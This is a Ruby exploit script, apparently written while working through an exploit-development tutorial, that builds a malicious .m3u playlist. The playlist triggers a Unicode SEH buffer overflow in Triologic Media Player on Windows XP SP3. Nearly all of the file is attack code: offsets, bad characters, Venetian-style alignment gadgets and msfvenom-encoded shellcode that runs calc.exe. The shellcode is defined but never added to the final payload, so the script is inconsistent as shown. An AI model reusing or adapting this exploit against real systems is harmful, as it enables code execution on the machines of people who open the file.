# Brad Beacham 2018
#
#####################################################################################
# INFORMATION
# http://www.fuzzysecurity.com/tutorials/expDev/5.html
# Confirmed on Windows XP SP3
####    SEH record (nseh field) at 0x0012e270 overwritten with unicode pattern : 0x00410038 (offset 536)
####	0x004d0041 : pop ebx # pop ebp # ret 0x10 | (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)

# Badchars: "\x00\x0d\x0a\x3d\x20\x3f"

#####################################################################################

# Appends notifications to the start of text (ie. [*], [+], etc)
#####################################################################################
class String
	def error;        "\e[31m[!]\e[0m #{self}" end        # [!] Red
	def fail;         "\e[31m[-]\e[0m #{self}" end		  # [-] Red
	def success;      "\e[32m[+]\e[0m #{self}" end        # [+] Green
	def event;        "\e[34m[*]\e[0m #{self}" end        # [*] Blue
	def debug;        "\e[35m[%]\e[0m #{self}" end        # [%] Magenta
	def notification; "[-] #{self}" end                   # [-]
end

# Some simple input validation
input = ARGV
if input[0].nil?
	puts "USAGE: TriologicExploit.rb [filename]".error
	abort()
end
output = input[0] + ".m3u"

#####################################################################################
# Generate the exploit
buffer = 5000
offset = 536

nseh = "\x41\x71"
seh = "\x41\x4d"
junk = "\x90" * offset

#!mona unicodealign -a 0012BB58 -b eax
# The best this could do is align EAX with 0x0012BBB0, which happens to be PUSH EAX!
# Gonna attempt to offset this +100
# Estimated to be 0012BCB0, and perla!
# For reference, area for buffer is now between 0x0012BCB0 and ~0x0012DE2C (~8,500 bytes)

align = 
#"\xbb\x56\x41"	+	# MOV EBX,41005600
"\xbb\x57\x41"	+	# MOV EBX,41005700
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\xb8\x55\x41"	+	# MOV EAX,41005500
"\xe3"			+	# ADD BL,AH
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\xb9\x4b\x41"	+	# MOV ECX,41004B00
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\xb8\x6d\x41"	+	# MOV EAX,41006D00
"\xe1"			+	# ADD CL,AH
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\xba\x79\x41"	+	# MOV EDX,41007900
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\xb8\x63\x41"	+	# MOV EAX,41006300
"\xe2"			+	# ADD DL,AH
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\x55"			+	# PUSH EBP
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH
"\x58"			+	# POP EAX
"\xfc"			+	# ADD AH,BH
"\xec"			+	# ADD AH,CH
"\xec"			+	# ADD AH,CH
"\xec"			+	# ADD AH,CH
"\xcc"			+	# ADD AH,CL
"\xd4"			+	# ADD AH,DL
"\xf8"			+	# ADD AL,BH
"\xf8"			+	# ADD AL,BH
"\xf8"			+	# ADD AL,BH
"\xd8"			+	# ADD AL,BL
"\xe8"			+	# ADD AL,CH
"\xc8"			+	# ADD AL,CL
"\xf0"			+	# ADD AL,DH
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH (Venetian Padding)
"\x50"			+	# PUSH EAX
"\x6d"			+	# ADD BYTE PTR SS:[EBP],CH (Venetian Padding)
"\xC3"				# RETN

filler = "\x42" * (buffer - (offset + nseh.length + seh.length + align.length))

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00\x0d\x0a\x3d\x20\x3f' -i 1 -f ruby
buf =
"\xda\xda\xb8\xba\xd4\x44\xf7\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x31\x31\x42\x18\x03\x42\x18\x83\xc2\xbe\x36\xb1\x0b" +
"\x56\x34\x3a\xf4\xa6\x59\xb2\x11\x97\x59\xa0\x52\x87\x69" +
"\xa2\x37\x2b\x01\xe6\xa3\xb8\x67\x2f\xc3\x09\xcd\x09\xea" +
"\x8a\x7e\x69\x6d\x08\x7d\xbe\x4d\x31\x4e\xb3\x8c\x76\xb3" +
"\x3e\xdc\x2f\xbf\xed\xf1\x44\xf5\x2d\x79\x16\x1b\x36\x9e" +
"\xee\x1a\x17\x31\x65\x45\xb7\xb3\xaa\xfd\xfe\xab\xaf\x38" +
"\x48\x47\x1b\xb6\x4b\x81\x52\x37\xe7\xec\x5b\xca\xf9\x29" +
"\x5b\x35\x8c\x43\x98\xc8\x97\x97\xe3\x16\x1d\x0c\x43\xdc" +
"\x85\xe8\x72\x31\x53\x7a\x78\xfe\x17\x24\x9c\x01\xfb\x5e" +
"\x98\x8a\xfa\xb0\x29\xc8\xd8\x14\x72\x8a\x41\x0c\xde\x7d" +
"\x7d\x4e\x81\x22\xdb\x04\x2f\x36\x56\x47\x25\xc9\xe4\xfd" +
"\x0b\xc9\xf6\xfd\x3b\xa2\xc7\x76\xd4\xb5\xd7\x5c\x91\x5a" +
"\x3a\x75\xef\xf2\xe3\x1c\x52\x9f\x13\xcb\x90\xa6\x97\xfe" +
"\x68\x5d\x87\x8a\x6d\x19\x0f\x66\x1f\x32\xfa\x88\x8c\x33" +
"\x2f\xeb\x53\xa0\xb3\xc2\xf6\x40\x51\x1b"


exploit = junk + nseh + seh + align + filler

#####################################################################################
# Send the exploit
begin
	puts "#######################################################".event	
	if File.exists?(output)
		puts "File [#{output}] exists!! Overwriting!".event
	end

rescue SystemExit, Interrupt
	puts "[Ctrl + C] caught! Exiting".error
	abort()

rescue
	puts "Unable to generate file [#{output}]".error
	abort()

else
	outputFile = File.open(output, "w")
	outputFile.puts exploit
	outputFile.close
    puts "File [#{output}] created.  Load the file and the Calculator will spawn on the target.".success
end
puts ""
